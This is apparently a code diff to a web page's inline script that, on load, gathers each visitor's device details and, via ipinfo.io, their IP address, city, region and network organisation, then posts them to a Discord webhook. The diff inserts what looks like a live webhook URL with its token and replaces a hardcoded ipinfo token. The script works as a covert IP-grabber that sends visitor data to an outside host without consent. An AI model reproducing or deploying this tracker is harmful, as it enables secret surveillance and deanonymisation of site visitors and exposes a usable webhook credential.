@@ -103,8 +103,9 @@
 
     <script>
 
+    // Function to send device and geolocation information to Discord webhook
     function sendDeviceInfoToWebhook() {
-        const webhookURL = 'https://discord.com/api/webhooks/your-webhook-url';
+        const webhookURL = 'https://discord.com/api/webhooks/1296274274151043072/ImR7zXQ3rInBB3LXRwj_-n-PZgnBv-UupH44qtpY1p6LkwuGnOjSwzvFWWZtMyG0zp42';
 
         // Device information
         const deviceInfo = {
@@ -115,8 +116,8 @@
             language: navigator.language
         };
 
-        // Fetch geolocation info and detect VPN/proxy
-        fetch('https://ipinfo.io?token=0a7775d6f7e150')  // Use your ipinfo.io token
+        // Fetch geolocation info from ipinfo.io
+        fetch('https://ipinfo.io?token=YOUR_API_TOKEN') // Replace with your ipinfo.io token
             .then(response => response.json())
             .then(data => {
                 const geoInfo = {
@@ -124,39 +125,51 @@
                     country: data.country,
                     region: data.region,
                     city: data.city,
-                    org: data.org,
-                    vpnStatus: data.security?.vpn ? "Yes (VPN detected)" : "No (No VPN)",
-                    proxyStatus: data.security?.proxy ? "Yes (Proxy detected)" : "No (No Proxy)"
+                    org: data.org
                 };
 
-                // Construct the message content for Discord
-                const content = `
-                    **Device Information:**
-                    - **User Agent:** ${deviceInfo.userAgent}
-                    - **Platform:** ${deviceInfo.platform}
-                    - **Screen Width:** ${deviceInfo.screenWidth}
-                    - **Screen Height:** ${deviceInfo.screenHeight}
-                    - **Language:** ${deviceInfo.language}
+                // Construct the embedded message content for Discord
+                const embed = {
+                    embeds: [{
+                        title: "Device and Geolocation Information",
+                        color: 3447003,  // You can change the color code
+                        fields: [
+                            {
+                                name: "Device Information",
+                                value: `
+                                **User Agent:** ${deviceInfo.userAgent}
+                                **Platform:** ${deviceInfo.platform}
+                                **Screen Resolution:** ${deviceInfo.screenWidth} x ${deviceInfo.screenHeight}
+                                **Language:** ${deviceInfo.language}
+                                `,
+                                inline: false
+                            },
+                            {
+                                name: "Geolocation Information",
+                                value: `
+                                **IP Address:** ${geoInfo.ip}
+                                **Country:** ${geoInfo.country}
+                                **Region:** ${geoInfo.region}
+                                **City:** ${geoInfo.city}
+                                **Organization:** ${geoInfo.org}
+                                `,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "Information fetched using ipinfo.io"
+                        },
+                        timestamp: new Date()  // Adds the timestamp
+                    }]
+                };
 
-                    **Geolocation Information:**
-                    - **IP Address:** ${geoInfo.ip}
-                    - **Country:** ${geoInfo.country}
-                    - **Region:** ${geoInfo.region}
-                    - **City:** ${geoInfo.city}
-                    - **Organization:** ${geoInfo.org}
-                    - **VPN Status:** ${geoInfo.vpnStatus}
-                    - **Proxy Status:** ${geoInfo.proxyStatus}
-                `;
-
-                // Send the information to the Discord webhook
+                // Send the embedded information to the Discord webhook
                 fetch(webhookURL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        content: content,
-                    })
+                    body: JSON.stringify(embed)
                 })
                 .then(response => {
                     if (response.ok) {
